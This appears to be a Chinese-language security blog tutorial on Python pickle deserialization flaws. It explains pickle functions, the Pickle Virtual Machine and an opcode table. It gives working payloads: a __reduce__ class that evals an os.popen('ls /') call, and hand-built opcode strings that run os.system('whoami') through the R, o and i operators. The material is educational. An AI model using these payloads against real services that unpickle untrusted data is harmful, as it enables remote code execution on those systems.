---
title: pickle反序列化
date: '2025-05-02 17:48:18'
updated: '2025-05-09 09:34:27'
permalink: /post/pickle-deserialization-pyg8c.html
comments: true
toc: true
---



# pickle反序列化

## pickle反序列化漏洞

### 基础知识

pickle是python中的一个库，可以对对象进行序列化和反序列化的操作，这个和php的 `serialize()` 的功能是一样的，都是为了方便数据的传输，可以直接将对象的数据转换为二进制串，在不同地方传输

在python中，几乎所有东西都是对象：整数、浮点数、列表、元组、字典、函数、类等

在python中，使用 `.` 调用实例的属性和方法
python的对象会有示例属性和类属性：

* 实例属性是这个类在实例化一个对象时用 `__init__` 魔术方法定义的
* 类属性是在类中定义的，每一个由这个类实例化出来的对象都由这个属性，可以通过 `类名.变量名` 或者 `self.__class__.变量名` 调用，不用实例化也可以调用

### pickle序列化

#### 函数

1. `pickle.dump()`：将python对象转换成二进制对象，对文件操作
2. `pickle.dumps()`：将python对象转换成二进制对象，对字符串操作
3. `pickle.load()`：将二进制对象转换为python对象，对文件操作
4. `pickle.loads()`：将二进制对象转换为python对象，对字符串操作

#### python魔术方法

在pickle反序列化中，最重要的一个魔术方法就是 `__reduce__` 方法
当使用pickle序列化对象时，python就会尝试调用对象的 `__reduce__` 方法，最简单的反序列化漏洞就是重写这个魔术方法

```python
import pickle
import base64
class person():
    def __reduce__(self):
        return (eval, ("print(__import__('os').popen('ls /').read())",))

a = person()
b = pickle.dumps(a)
print(base64.b64encode(b))
print(pickle.loads(b))
```

![image-20250421154830453](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250421154830453.png)

#### PVM

`Pickle Virtual Machine`是pickle在反序列时使用的字节码解析器，由三部分组成

* 指令处理器：从二进制流中读取 `opcode` 和参数并对其进行处理解析，直到遇到结束符后停止，将最终留在栈顶的值作为反序列化对象返回
* stack（栈）：由python的 list 实现，用来临时存储数据、参数、以及对象
* memo（内存）：由python的 dict 实现，为PVM的整个生命周期提供存储

`pickle` 的本质是基于栈的虚拟机，是由 `opcode` 组成的，通过对 `opcode` 的编写来进行python代码执行等操作，直接写的 `opcode` 的灵活性比使用pickle序列化产生的二进制更高，并且有的代码不能通过 `pickle` 得到

#### opcode

常用的 `opcode` 及解释，从大佬的博客复制的orz

|指令|描述|具体写法|栈上的变化|
| ----| -------------------------------------------------------------------------------------------------------------------------------------------------------------| ------------------| ----------------------------------------------------------|
|c|获取一个全局对象或者import一个对象|`c[module]\n[instance]\n`|获得的对象入栈|
|o|寻找栈中的上一个MARK(一个特殊的标记)，以之间的第一个数据（必须为函数）为callable（MARK的上一个数据），第二个到第n个数据为参数，执行该函数（或实例化一个对象）|`o`|整个过程涉及的数据都出栈，函数的返回值（或生成的对象）入栈|
|i|相当于 c 和 o 的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局参数|`i[module]\n[instance]\n`|整个过程涉及的数据都出栈，函数的返回值（或生成的对象）入栈|
|N|实例化一个None|`N`|获得的对象入栈|
|S|实例化一个字符串对象|`S'marin'\n`（也可以用双引号）|获得的对象入栈|
|V|实例化一个UNICODE字符对象|`Vmarin\n`|获得的对象入栈|
|I|实例化一个int对象|`Ixxx\n`|获得的对象入栈|
|F|实例化一个float对象|`Fx.x\n`|获得的对象入栈|
|R|选择栈上的第一个对象为函数，第二个对象为参数（必须是元组）然后调用该函数|`R`|函数和参数出栈，函数的返回值入栈|
|.|程序结束，栈顶的一个元素作为 `pickle.loads()` 的返回值|`.`|无|
|(|向栈中压入一个MARK标记|`(`|MARK标记入栈|
|t|寻找栈中的上一个MARK，并组合之间的数据为元组|`t`|MARK标记以及被组合的数据出栈，元组入栈|
|)|向栈中压入一个空元组|`)`|空元组入栈|
|]|向栈中压入一个空列表|`]`|空列表入栈|
|d|寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须要有偶数个，满足key-value）|`d`|MARK标记以及被组合的数据出栈，字典入栈|
|}|向栈中压入一个空字典|`}`|空字典入栈|
|p|将栈顶对象存储至memo_n|`pn\n`|无|
|g|将memo_n的对象压栈|`gn\n`|对象被压栈|
|0|丢弃栈顶对象|`0`|栈顶对象被丢弃|
|b|使用栈中的第一个元素（存储多个属性名:属性值的字典）对第二个元素（对象示例）进行属性设置|`b`|栈顶上的第一个元素出栈|
|s|将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须是列表或字典，列表以数字作为key）|`s`|第一、二个元素出栈第三个元素添加或更新|
|u|寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个）并全部添加或更新到该MARK之前的一个元素（必须为字典）中|`u`|MARK标记和被组合的数据出栈，字典更新|
|a|将栈中的第一个元素 append 到第二个元素（列表）中|`a`|栈顶元素出栈，第二个元素更新|
|e|寻找栈中的上一个MARK，组合之间的数据并 extends 到该MARK之前的一个元素（列表）中|`e`|MARK标记和被组合的数据出栈，列表更新|

#### pickletools

`pickletools` 是一个python模块，常用的一个方法是 `pickletools.dis()`，将一段opcode转换为易读的形式

```python
import pickletools

opcode = b'''c__main__
name
(S'name'
S'marin'
db.
'''

pickletools.dis(opcode)
```

![image-20250421164821400](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250421164821400.png)

> 解析一下
>
> ```
> c__main__
> name
> ```
>
> 导入一个对象 `__main__.name`
>
> ```
> (S'name'
> ```
>
> 先压入一个MARK标记，然后压入一个字符串name
>
> ```
> S'marin'
> ```
>
> 压入一个字符串marin
>
> ```
> db.
> ```
>
> `d`：将MARK到现在的两个元素组成字典 `{'name':'marin'}`
> `b`：将字典的内容设置为导入的对象的属性
> `.`：结束

### 利用

#### 变量覆盖

```python
import pickle
class name():
    def __init__(self,id):
        self.id = id

limbo = name('limbo')
print(limbo.id)

opcode = b'''c__main__
limbo
(S'id'
S'marin'
db.'''

pickle.loads(opcode)
print(limbo.id)
```

![image-20250421165441037](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250421165441037.png)

#### 函数执行

**​`c`​**​**操作符**

用来压入需要的模块，如os，sys等

**​`R`​**​**操作符**

```python
opcode = b'''cos      
system
(S'whoami'
tR.'''
opcode = b'''cos\nsystem\n(S'whoami'\ntR.'''
```

**​`o`​**​**操作符**

```python
opcode = b'''(cos
system
S'whoami'
o.'''
opcode = b'''(cos\nsystem\nS'whoami'\no.'''
```

**​`i`​**​**操作符**

```python
opcode = b'''(S'whoami'
ios
system
.'''
opcode = b'''(S'whoami'\nios\nsystem\n.'''
```

不过这些操作符我不是很清楚怎么返回值，可能只能写到文件中

‍

‍

‍

参考：

[pickle反序列化漏洞基础知识与绕过简析-先知社区](https://xz.aliyun.com/news/13498)
